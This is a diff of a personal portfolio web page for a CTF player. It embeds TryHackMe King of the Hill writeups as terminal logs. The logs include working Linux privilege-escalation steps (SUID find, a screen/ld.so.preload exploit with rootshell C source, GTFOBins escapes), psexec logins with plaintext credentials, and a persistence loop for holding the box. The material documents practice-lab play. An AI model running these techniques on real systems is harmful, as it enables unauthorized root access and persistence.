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"
+              alt="0x7f3a"
+            />
+          </div>
+          <div class="id-block">
+            <h1>0x7f3a</h1>
+            <div class="real-name">[REDACTED]</div>
+            <div class="role-tag">
+              <span class="dot"></span>Red Teamer / Pwn+RE Practitioner /
+              PrivEsc Specialist
+            </div>
+          </div>
+        </div>
+
+        <div class="socials">
+          <a
+            class="social-btn"
+            href="https://www.instagram.com/penguin_0x7f3a"
+            target="_blank"
+            rel="noopener"
+            aria-label="Instagram"
+          >
+            <svg viewBox="0 0 24 24">
+              <rect x="2" y="2" width="20" height="20" rx="5" />
+              <circle cx="12" cy="12" r="4" />
+              <line x1="17.5" y1="6.5" x2="17.5" y2="6.5" />
+            </svg>
+          </a>
+          <a
+            class="social-btn gh"
+            href="https://github.com/0x7f3a"
+            target="_blank"
+            rel="noopener"
+            aria-label="GitHub"
+          >
+            <svg viewBox="0 0 24 24">
+              <path
+                d="M12 .5C5.73.5.98 5.24.98 11.5c0 5.02 3.26 9.28 7.78 10.78.57.1.78-.25.78-.55 0-.27-.01-1.16-.02-2.11-3.17.69-3.84-1.34-3.84-1.34-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.02 1.75 2.68 1.25 3.34.95.1-.74.4-1.25.72-1.54-2.53-.29-5.19-1.27-5.19-5.63 0-1.24.44-2.26 1.17-3.06-.12-.29-.51-1.46.11-3.04 0 0 .96-.31 3.14 1.17a10.9 10.9 0 0 1 5.72 0c2.18-1.48 3.14-1.17 3.14-1.17.62 1.58.23 2.75.11 3.04.73.8 1.17 1.82 1.17 3.06 0 4.37-2.67 5.34-5.21 5.62.41.36.77 1.06.77 2.14 0 1.54-.01 2.79-.01 3.17 0 .3.2.66.79.55 4.52-1.51 7.77-5.77 7.77-10.78C23.02 5.24 18.27.5 12 .5z"
+              />
+            </svg>
+          </a>
+          <a
+            class="social-btn"
+            href="https://tryhackme.com/p/0x7f3a"
+            target="_blank"
+            rel="noopener"
+            aria-label="TryHackMe"
+          >
+            <svg viewBox="0 0 24 24">
+              <path
+                d="M17.5 10.2a4 4 0 0 0-7.6-1.7A3.4 3.4 0 0 0 9 15h8.5a3.3 3.3 0 0 0 0-6.6c-.16 0-.32.01-.47.03z"
+              />
+              <line x1="7" y1="18.2" x2="7" y2="18.21" />
+              <line x1="10" y1="18.2" x2="10" y2="18.21" />
+              <line x1="13" y1="18.2" x2="13" y2="18.21" />
+              <line x1="7" y1="20.6" x2="7" y2="20.61" />
+              <line x1="10" y1="20.6" x2="10" y2="20.61" />
+            </svg>
+          </a>
+          <a
+            class="social-btn"
+            href="https://profile.hackthebox.com/profile/019e9fdc-df40-7346-8de9-0e26e3542a65?utm_medium=copy_url"
+            target="_blank"
+            rel="noopener"
+            aria-label="HackTheBox"
+          >
+            <svg viewBox="0 0 24 24">
+              <path d="M12 2.5l8.2 4.75v9.5L12 21.5l-8.2-4.75v-9.5z" />
+              <path d="M12 11.9l-4.1-2.4M12 11.9l4.1-2.4M12 11.9v4.8" />
+            </svg>
+          </a>
+          <div
+            class="social-btn discord fill"
+            title="Discord: penguin_0x7f3a"
+            aria-label="Discord: penguin_0x7f3a"
+          >
+            <svg viewBox="0 0 24 24">
+              <path
+                d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.522 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1568 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"
+              />
+            </svg>
+          </div>
+          <div
+            class="social-btn fill nolink"
+            title="PortSwigger: 0x7f3a"
+            aria-label="PortSwigger: 0x7f3a"
+          >
+            <svg viewBox="0 0 24 24">
+              <path d="M13 2L4 14h7l-1 8 10-13h-7l0-7z" fill="var(--ink)" />
+            </svg>
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="ln">
+            <span class="prompt">#</span><span class="cmd">whoami</span>
+          </div>
+          <div class="ln">
+            <span class="out"
+              >0x7f3a — offensive security &amp; binary exploitation</span
+            >
+          </div>
+          <div class="ln">
+            <span class="prompt">#</span><span class="cmd">contact --pgp</span>
+          </div>
+          <div class="ln">
+            <span class="prompt">#</span><span class="cmd">cat flag.txt</span>
+          </div>
+          <div class="ln">
+            <span class="out"
+              >flag{y0u_f0und_m3_0x7f3a}<span class="cursor"></span
+            ></span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ───────── PROJECTS ───────── -->
+      <section class="view" id="view-projects" hidden>
+        <h2 class="view-title">Projects</h2>
+        <p class="view-sub">Things I've built.</p>
+        <div class="entries" id="list-projects"></div>
+        <button class="back" data-go="home">&lt; back to profile</button>
+      </section>
+
+      <!-- ───────── WRITEUPS ───────── -->
+      <section class="view" id="view-writeups" hidden>
+        <h2 class="view-title">Writeups</h2>
+        <p class="view-sub">TryHackMe King of the Hill writeups.</p>
+        <div class="entries" id="list-writeups"></div>
+        <button class="back" data-go="home">&lt; back to profile</button>
+      </section>
+
+      <!-- ───────── ACHIEVEMENTS ───────── -->
+      <section class="view" id="view-achievements" hidden>
+        <h2 class="view-title">Achievements</h2>
+        <p class="view-sub">Rankings on the platforms I play.</p>
+        <div class="entries" id="list-achievements"></div>
+        <button class="back" data-go="home">&lt; back to profile</button>
+      </section>
+
+      <!-- ───────── TIMELINE ───────── -->
+      <section class="view" id="view-timeline" hidden>
+        <h2 class="view-title">Timeline</h2>
+        <p class="view-sub">How I got here.</p>
+        <div class="timeline">
+          <div class="cmdline">
+            <span class="prompt">#</span><span class="cmd">cat journey.log</span
+            ><button class="tl-replay" id="tlReplay" type="button">
+              ./replay
+            </button>
+          </div>
+          <div class="tl-hint"># click a year to expand</div>
+          <div id="tl-items"></div>
+        </div>
+        <button class="back" data-go="home">&lt; back to profile</button>
+      </section>
+
+      <div class="footer">
+        Antarctica &middot; TryHackMe / HackTheBox / PortSwigger
+      </div>
+    </div>
+
+    <script>
+      /* ════════ EDIT YOUR CONTENT HERE ════════
+                           Each item: { title, desc, tags: [], href }  (href optional)               */
+
+      const PROJECTS = [
+        {
+          title: "PrivAudit",
+          desc: "Read-only Linux privilege-escalation auditor written in C. Checks a host for common privesc paths without changing anything.",
+          tags: ["C", "Linux", "PrivEsc"],
+          href: "https://github.com/0x7f3a/Privesc-Audit",
+        },
+        {
+          title: "ThreatHex",
+          desc: "Detects phishing and scam messages, dual-powered by JavaScript and a machine learning model.",
+          tags: ["JavaScript", "ML", "Phishing detection"],
+          href: "https://threathex-0x7f3a9c1e.github.io/",
+        },
+      ];
+
+      const WRITEUPS = [
+        {
+          title: "Carnage",
+          desc: "SUID find binary (find -exec sh) for instant root; pulled 4 flags across users plus a base64 flag hidden in a SQLite web.db.",
+          tags: ["Linux", "SUID", "KoTH"],
+          log: String.raw`┌──(root㉿kali)-[/home/kali]
+            └─# ssh bobba@10.10.60.230
+            ** WARNING: connection is not using a post-quantum key exchange algorithm.
+            ** This session may be vulnerable to "store now, decrypt later" attacks.
+            ** The server may need to be upgraded. See https://openssh.com/pq.html
+            bobba@10.10.60.230's password:
+
+            The programs included with the Debian GNU/Linux system are free software;
+            the exact distribution terms for each program are described in the
+            individual files in /usr/share/doc/*/copyright.
+
+            Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+            permitted by applicable law.
+            $ whoami
+            bobba
+            $ /usr/bin/find . -exec /bin/sh \; -quit
+            # whoami
+            root
+            # id
+            uid=1000(bobba) gid=1000(bobba) euid=0(root) groups=1000(bobba)
+            # cat /home/bobba/flag1.txt
+            [REDACTED]
+            # cat /home/yoda/flag2.txt
+            [REDACTED]
+            # cat /home/duku/flag3.txt
+            [REDACTED]
+            # cat /root/flag4.txt
+            [REDACTED]
+            # /var/www/html/web1/web.db
+            /bin/sh: 7: /var/www/html/web1/web.db: Permission denied
+            # cat /var/www/html/web1/web.db
+            CtableusersusersCREATE TABLE users ( username TEXT NOT NULL PRIMARY KEY, password TEXT NOT NULL, flag TEXT))=indexsqlite_autoi\ufffd\ufffdM-ubobba-\`G)8(t/NDkZ"u^{[REDACTED]
+            \ufffd\ufffd      bobba# cat /var/www/html/web2/flag.txt
+            [REDACTED]
+            # cat /var/www/html/web3/flag.txt
+            [REDACTED]
+            #
+            1st flag is decoded by ROT13 while the second flag is decoded using hex
+            for the web.db flag it's a base64 encoded string`,
+        },
+        {
+          title: "Food",
+          desc: "LD_PRELOAD hijack via ld.so.preload + a vulnerable screen session to drop a SUID rootshell, then planted a persistence loop for KoTH.",
+          tags: ["Linux", "LD_PRELOAD", "KoTH"],
+          log: String.raw`Credentials: ramen@<Target_IP> Password: [REDACTED]
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# ssh ramen@10.10.125.28
+            ** WARNING: connection is not using a post-quantum key exchange algorithm.
+            ** This session may be vulnerable to "store now, decrypt later" attacks.
+            ** The server may need to be upgraded. See https://openssh.com/pq.html
+            ramen@10.10.125.28's password:
+            Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+
+             * Documentation:  https://help.ubuntu.com
+             * Management:     https://landscape.canonical.com
+             * Support:        https://ubuntu.com/advantage
+
+              System information as of Tue Sep  8 16:20:01 UTC 2026
+
+              System load:  0.0               Processes:           103
+              Usage of /:   43.7% of 9.78GB   Users logged in:     1
+              Memory usage: 51%               IP address for ens5: 10.10.125.28
+              Swap usage:   0%
+
+            0 packages can be updated.
+            0 updates are security updates.
+
+            Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+            Last login: Tue Sep  8 16:18:38 2026 from 192.168.128.10
+            ramen@foodctf:~$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+            ramen@foodctf:~$ id
+            uid=1003(ramen) gid=1003(ramen) groups=1003(ramen)
+            ramen@foodctf:~$ cat >/tmp/libhax.c <<'EOF'
+            > #include <stdio.h>
+            > #include <sys/types.h>
+            > #include <unistd.h>
+            > __attribute__((constructor))
+            > void dropshell(void){chown("/tmp/rootshell",0,0);chmod("/tmp/rootshell",04755);unlink("/etc/ld.so.preload");}
+            > EOF
+            ramen@foodctf:~$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+            /tmp/libhax.c: In function 'dropshell':
+            /tmp/libhax.c:5:50: warning: implicit declaration of function 'chmod'; did you mean 'chroot'? [-Wimplicit-function-declaration]
+             void dropshell(void){chown("/tmp/rootshell",0,0);chmod("/tmp/rootshell",04755);unlink("/etc/ld.so.preload");}
+                                                              ^~~~~
+                                                              chroot
+            ramen@foodctf:~$ cat >/tmp/rootshell.c <<'EOF'
+            > #include <unistd.h>
+            > int main(){setuid(0);setgid(0);execl("/bin/sh","sh",NULL);}
+            > EOF
+            ramen@foodctf:~$ gcc -o /tmp/rootshell /tmp/rootshell.c
+            ramen@foodctf:~$ cd /etc
+            ramen@foodctf:/etc$ umask 000
+            ramen@foodctf:/etc$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+            ramen@foodctf:/etc$ screen -ls
+            ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+            There is a screen on:
+                    1588.x  (Detached)
+            1 Socket in /tmp/screens/S-ramen.
+            ramen@foodctf:/etc$ /tmp/rootshell
+            # id
+            sh: 1: idid: not found
+            # id
+            uid=0(root) gid=0(root) groups=0(root),1003(ramen)
+            # nano KoTH.c
+            # gcc KoTH.c -o KoTH
+            # ./KoTH
+            ^C
+            # echo 0x7f3a > /root/king.txt
+            # chmod 400 /root/king.txt
+            # cat /root/king.txt
+            0x7f3a
+            # ./KoTH
+            ^C
+            # cat king.txt
+            cat: king.txt: No such file or directory
+            # cat /root/king.txt
+            0x7f3a
+            # nano /root/king.txt
+            # exit
+            ramen@foodctf:/etc$ /tmp/rootshell
+            # id
+            uid=0(root) gid=0(root) groups=0(root),1003(ramen)
+            # nano KoTH.c
+            # ./KoTH.c
+            sh: 3: ./KoTH.c: Permission denied
+            # ./KoTH
+            ^C
+            # chmod 600 /root/king.txt
+            # ./KoTH
+            ^C
+            # ls -l /root/king.txt
+            -rw------- 1 root root 6 Sep  8 16:29 /root/king.txt
+            # cat KoTH.c
+            #include <stdio.h>
+            #include <unistd.h>
+
+            int main(void) {
+                const char *username = "0x7f3a";
+                const char *file = "/root/king.txt";
+
+                while (1) {
+                    FILE *f = fopen(file, "w");
+
+                    if (f != NULL) {
+                        fprintf(f, "%s\n", username);
+                        fclose(f);
+                    }
+
+                    usleep(100000); // 0.1 seconds
+                }
+
+                return 0;
+            }
+            // How to Run:
+            // Compile: gcc KoTH.c -o KoTH
+            // Run: sudo ./KoTH
+
+            # ./KoTH &
+            # ps aux | grep '[K]oTH'
+            root      2083  0.1  0.0   4508   740 pts/0    S    16:31   0:00 ./KoTH
+            # cat /root/king.txt
+            0x7f3a`,
+        },
+        {
+          title: "Fortune",
+          desc: "Chained GTFOBins (ionice/nice/xargs) to pop a root shell off a misconfigured SUID binary; cracked a bonus zip with fcrackzip.",
+          tags: ["Linux", "GTFOBins", "KoTH"],
+          log: String.raw`┌──(root㉿kali)-[/home/kali]
+            └─# cat creds.txt
+            fortuna:[REDACTED]
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# ssh fortuna@10.10.37.153
+            ** WARNING: connection is not using a post-quantum key exchange algorithm.
+            ** This session may be vulnerable to "store now, decrypt later" attacks.
+            ** The server may need to be upgraded. See https://openssh.com/pq.html
+            fortuna@10.10.37.153's password:
+
+                    ################################
+                    ###  Come to try your luck?  ###
+                    ### Welcome to your fortune! ###
+                    ################################
+
+            fortuna@fortune:~$ ionice /bin/sh -p
+            $ /usr/bin/nice /bin/sh -p
+            # xargs -a /dev/null sh -p
+            # python -c 'import pty; pty.spawn("/home/lucky_shell")'
+            Rolling the dice!
+            Unlucky!
+            # id
+            uid=1000(fortuna) gid=1000(fortuna) euid=0(root) groups=1000(fortuna),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
+            # whoami
+            root
+            # cat /media/darts
+            [REDACTED]
+            # cat /srv/blackjack
+            [REDACTED]
+            # /lib/checkers
+            sh: 6: /lib/checkers: Permission denied
+            # cat /lib/checkers
+            [REDACTED]
+            # cat /usr/games/flag
+            [REDACTED]
+            # cat /usr/local/games/flag
+            [REDACTED]
+            # cat /geama/flag
+            [REDACTED]
+            # cat /home/fortuna/Desktop/chess
+            [REDACTED]
+            #
+            How to get the creds
+            nc <target_ip> 3333 -w 10 | base64 -d > fortuna.zip
+            fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt fortuna.zip`,
+        },
+        {
+          title: "H1-Medium",
+          desc: "Windows box taken with impacket-psexec off leaked creds, dumping Desktop flags from five separate user profiles.",
+          tags: ["Windows", "Impacket"],
+          log: String.raw`┌──(root㉿kali)-[/home/kali]
+            └─# impacket-psexec TROY.thm/achilles:winniethepooh@10.10.239.66
+            Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+            [*] Requesting shares on 10.10.239.66.....
+            [*] Found writable share ADMIN$
+            [*] Uploading file qzHOWyhP.exe
+            [*] Opening SVCManager on 10.10.239.66.....
+            [*] Creating service mrXI on 10.10.239.66.....
+            [*] Starting service mrXI.....
+            [!] Press help for extra shell commands
+            Microsoft Windows [Version 10.0.17763.1757]
+            (c) 2018 Microsoft Corporation. All rights reserved.
+
+            C:\Windows\system32> type C:\Users\achilles\Desktop\flag.txt
+            [REDACTED]
+            C:\Windows\system32> type C:\Users\agamemnon\Desktop\flag.txt
+            [REDACTED]
+            C:\Windows\system32> type C:\Users\hector\Desktop\flag.txt
+            [REDACTED]
+            C:\Windows\system32> type C:\Users\helen\Desktop\flag.txt
+            [REDACTED]
+            C:\Windows\system32> type C:\Users\patrocles\Desktop\flag.txt
+            [REDACTED]
+            C:\Windows\system32> echo "0x7f3a" > C:\king.txt
+            Access is denied.
+
+            C:\Windows\system32> type C:\king.txt
+            "0x7f3a"
+
+            C:\Windows\system32> attrib -R C:\king.txt
+
+            C:\Windows\system32> echo 0x7f3a > C:\king.txt
+
+            C:\Windows\system32> attrib +R C:\king.txt
+
+            C:\Windows\system32>`,
+        },
+        {
+          title: "Offline",
+          desc: "Domain-joined Windows KoTH: psexec in as a service account, then rotated through creds to lock down king.txt with attrib/icacls.",
+          tags: ["Windows", "AD", "KoTH"],
+          log: String.raw`can go straight to system with psexec.py kingofthe.domain/svc_robotarmy:robots@<ip>
+
+            ssh: [REDACTED]
+
+            scara:[REDACTED]
+
+            toast:[REDACTED]
+
+            mykull:[REDACTED]
+
+            fed:[REDACTED]
+
+            king.txt, under Administrator/king-server/, can be made immutable with the attrib +r king.txt command.
+            note the icacls command could also be used to mess with permissions. can use takeown /f .\king.txt as a quick recover if someone else has taken over the file
+
+            when dealing with dicks do the following:
+
+            net user svc_robotarmy sdfsjkfskkjiouuiyeruiysdf
+            [establish a russh shell]
+            taskkill /f /pid powershell.exe
+            taskkill /f /pid cmd.exe
+            Number of flags: 8, (Flags are redacted cause of thm spoiler policy)`,
+        },
+        {
+          title: "Panda",
+          desc: "Containerized root shell with layered flags needing both hex and base64 decoding, including one buried in a Samba binary's strings.",
+          tags: ["Linux", "Encoding"],
+          log: String.raw`bash-4.2# id
+            uid=1001(shifu) gid=1001(shifu) euid=0(root) groups=1001(shifu)
+            bash-4.2# whoami
+            root
+            bash-4.2# cat king.txt
+            0x7f3a
+            bash-4.2# cat /root/.flag
+            [REDACTED]
